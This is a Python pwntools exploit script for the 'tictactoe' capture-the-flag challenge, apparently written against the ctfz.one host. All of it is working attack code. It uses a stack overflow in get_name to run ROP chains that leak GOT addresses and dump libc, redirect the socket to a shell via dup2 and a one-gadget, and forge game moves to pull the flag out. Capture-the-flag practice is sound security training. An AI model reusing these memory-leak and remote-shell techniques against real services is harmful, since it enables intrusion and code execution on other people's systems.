#!/usr/bin/env python3
from pwn import *

# get_name stack layout:
# +0x00  tmp_name
# +0x50  rbp
# +0x58  ret

pop_rdi = 0x40310b
pop_rsi_r15 = 0x403109
got_recv = 0x405208
got_setsockopt = 0x405230
nop = 0x401716
elf = ELF('tictactoe_files/tictactoe.dbg')


def fit_rop(*rop):
    rop = fit({0x58: b''.join(rop)})
    # assert b'\x0a' not in rop
    return rop


def dump_9_bytes(addr):
    return fit_rop(
        struct.pack('<QQ', pop_rdi, elf.symbols['completed.7326']),
        struct.pack('<Q', elf.symbols['reg_user']),  # sets edx = 9
        struct.pack('<QQ', pop_rdi, 4),
        struct.pack('<QQQ', pop_rsi_r15, addr, 0),
        struct.pack('<Q', elf.symbols['send_all']),
        struct.pack('<Q', elf.symbols['get_name']),
    )


def dump_952_bytes(addr):
    return fit_rop(
        struct.pack('<QQ', pop_rdi, elf.symbols['completed.7326']),
        struct.pack('<Q', nop),
        struct.pack('<Q', elf.symbols['send_board']),  # sets edx = 952
        struct.pack('<QQ', pop_rdi, 4),
        struct.pack('<QQQ', pop_rsi_r15, addr, 0),
        struct.pack('<Q', elf.symbols['send_all']),
        struct.pack('<Q', nop),
        struct.pack('<Q', elf.symbols['get_name']),
    )


IO1 = None


def connect():
    if args.LOCAL:
        global IO1
        IO1 = process([elf.path])
        IO1.recvline()
        if False:
            gdb.attach(IO1, gdbscript=f'''
#exit from get_name
#b *0x4016b3
#exit from reg_user
#b *0x401716
#b send_all
#b *0x401716
b send_board
c
''')
        return remote('127.0.0.1', 8889)
    else:
        if args.HOST == '':
            args.HOST = 'pwn-tictactoe.ctfz.one'
        return remote(args.HOST, 8889)


def dump_libc():
    libc_pos = 0
    libc_data = open('libc', 'wb')
    while True:
        io = connect()
        try:
            io.recvuntil('Please, enter your name: ')
            io.sendline(dump_9_bytes(got_recv))
            buf = io.recvn(9)
            recv, = struct.unpack('<Q', buf[:8])
            log.info('recv             = 0x%016lx', recv)

            for _ in range(1):
                io.recvuntil('Please, enter your name: ')
                io.sendline(dump_952_bytes(recv + libc_pos))
                junk = io.recvn(952)
                libc_data.write(io.recvn(952))
                libc_pos += 952

            io.recvuntil('Please, enter your name: ')
        finally:
            io.close()
            if args.LOCAL:
                IO1.close()


def shell(io, libc_base):
    dup2 = libc_base + 0xeabf0
    log.info('dup2             = 0x%016lx', dup2)
    io.recvuntil('Please, enter your name: ')
    io.sendline(fit_rop(
        struct.pack('<QQ', pop_rdi, 4),
        struct.pack('<QQQ', pop_rsi_r15, 0, 0),
        struct.pack('<Q', dup2),
        struct.pack('<QQ', pop_rdi, 4),
        struct.pack('<QQQ', pop_rsi_r15, 1, 0),
        struct.pack('<Q', dup2),
        struct.pack('<QQ', pop_rdi, 4),
        struct.pack('<QQQ', pop_rsi_r15, 2, 0),
        struct.pack('<Q', dup2),
        struct.pack('<Q', libc_base + 0x448a3),
        struct.pack('<Q', 0) * 24,
    ))
    io.interactive()


io = connect()
io.recvuntil('Please, enter your name: ')
io.sendline(dump_9_bytes(got_recv))
buf = io.recvn(9)
recv, = struct.unpack('<Q', buf[:8])
log.info('recv             = 0x%016lx', recv)
libc_base = recv - 0xfa620
log.info('libc_base        = 0x%016lx', libc_base)
assert libc_base & 0xfff == 0
pop_rsi = libc_base + 0x10674a
pop_rdx = libc_base + 0x106725
pop_rcx = libc_base + 0xe898e
mov_rcx_into_mem_rdx = libc_base + 0x8ec6d
pop_rsp = libc_base + 0x23f50

io.recvuntil('Please, enter your name: ')
io.sendline(dump_9_bytes(elf.symbols['server_ip']))
buf = io.recvn(9)
server_ip, = struct.unpack('<Q', buf[:8])
log.info('server_ip        = 0x%016lx', recv)

if False:
    gdb.attach(IO1, gdbscript='''
#b *0x4016b3
b send_get_flag
c
''')
new_stack = elf.symbols['field_str.4406'] + 0x280
for move in range(300):
    io.recvuntil('Please, enter your name: ')
    io.sendline(fit_rop(
        struct.pack('<QQ', pop_rdi, server_ip),
        struct.pack('<QQ', pop_rsi, elf.symbols['session']),
        struct.pack('<QQ', pop_rdx, move % 3),
        struct.pack('<QQ', pop_rcx, move % 3),
        struct.pack('<Q', elf.symbols['send_state']),
        struct.pack('<QQ', pop_rcx, elf.symbols['get_name']),
        struct.pack('<QQ', pop_rdx, new_stack),
        struct.pack('<Q', mov_rcx_into_mem_rdx),
        struct.pack('<QQ', pop_rsp, new_stack),
    ))
    log.info('move             = %d/300', move)

io.recvuntil('Please, enter your name: ')
io.sendline(fit_rop(
    struct.pack('<QQ', pop_rdi, server_ip),
    struct.pack('<QQ', pop_rsi, elf.symbols['session']),
    struct.pack('<QQ', pop_rdx, elf.symbols['psock']),
    struct.pack('<Q', elf.symbols['send_get_flag']),
    struct.pack('<QQ', pop_rdi, 4),
    struct.pack('<QQ', pop_rsi, elf.symbols['psock']),
    struct.pack('<QQ', pop_rdx, 64),
    struct.pack('<Q', elf.symbols['send_all']),
))

log.info('flag             = %s', io.recvline())

io.interactive()
